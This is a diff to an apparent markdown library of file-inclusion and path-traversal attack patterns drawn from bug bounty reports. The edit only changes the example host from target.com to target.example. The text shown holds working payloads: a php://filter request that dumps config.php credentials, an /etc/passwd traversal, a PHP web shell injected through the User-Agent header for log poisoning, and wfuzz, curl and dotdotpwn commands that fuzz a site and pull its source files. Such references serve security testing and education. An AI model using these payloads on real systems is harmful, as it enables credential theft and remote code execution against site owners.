@@ -13,7 +13,7 @@ Pattern library built from 31 public bug bounty reports.
 **Request:**
 ```http
 GET /view?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
-Host: target.com
+Host: target.example
 ```
 
 **Response:** Base64-encoded config.php containing DB credentials and API keys.
@@ -47,7 +47,7 @@ GET /download?file=../../../../etc/passwd HTTP/1.1
 **Step 1 — Inject payload into log:**
 ```http
 GET / HTTP/1.1
-Host: target.com
+Host: target.example
 User-Agent: <?php system($_GET['cmd']); ?>
 ```
 
@@ -135,17 +135,17 @@ C:\Users\Administrator\.ssh\id_rsa
 ```bash
 # wfuzz LFI fuzzing
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt \
-  --hc 404 "https://target.com/page.php?file=FUZZ"
+  --hc 404 "https://target.example/page.php?file=FUZZ"
 
 # PHP wrapper enumeration
 for FILE in index.php config.php db.php settings.php .env; do
   echo "=== $FILE ==="
-  curl -s "https://target.com/view?page=php://filter/convert.base64-encode/resource=$FILE" | \
+  curl -s "https://target.example/view?page=php://filter/convert.base64-encode/resource=$FILE" | \
     base64 -d 2>/dev/null
 done
 
 # dotdotpwn
-dotdotpwn.pl -m http -h target.com -o unix
+dotdotpwn.pl -m http -h target.example -o unix
 ```
 
 ### Path traversal in a file-handling API → arbitrary file read
